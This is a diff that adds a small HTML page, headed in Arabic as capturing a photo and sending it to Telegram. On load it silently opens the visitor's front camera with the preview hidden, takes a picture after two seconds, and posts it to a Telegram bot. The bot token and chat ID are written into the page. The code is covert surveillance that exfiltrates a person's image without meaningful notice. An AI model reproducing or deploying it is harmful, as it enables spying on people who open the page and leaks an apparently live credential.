@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Send Photo to Telegram</title>
+</head>
+<body>
+    <h1>التقاط صورة وإرسالها إلى Telegram</h1>
+    <video id="video" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+
+        // استبدل TOKEN و CHAT_ID بمعلوماتك
+        const BOT_TOKEN = '7867318181:AAFHSDLNLvdPFomn3HDxBbNCINP0LeDLHjw';
+        const CHAT_ID = '1832658980';
+
+        // تشغيل الكاميرا الأمامية
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
+            .then(stream => {
+                video.srcObject = stream;
+                video.play();
+
+                // بعد بضع ثوانٍ، التقاط الصورة
+                setTimeout(() => {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                    // تحويل الصورة إلى Blob
+                    canvas.toBlob(blob => {
+                        const formData = new FormData();
+                        formData.append('chat_id', CHAT_ID);
+                        formData.append('photo', blob);
+
+                        // إرسال الصورة إلى Telegram
+                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        })
+                        .then(response => response.json())
+                        .then(data => {
+                            console.log('تم الإرسال بنجاح:', data);
+                        })
+                        .catch(error => {
+                            console.error('فشل الإرسال إلى Telegram:', error);
+                        })
+                        .finally(() => {
+                            stream.getTracks().forEach(track => track.stop()); // إيقاف الكاميرا
+                        });
+                    }, 'image/png');
+                }, 2000); // وقت الانتظار قبل الالتقاط (3 ثوانٍ)
+            })
+            .catch(error => {
+                console.error('تعذر الوصول إلى الكاميرا:', error);
+                alert('حدث خطأ أثناء محاولة الوصول إلى الكاميرا. تأكد من السماح بالوصول.');
+            });
+    </script>
+</body>
+</html>
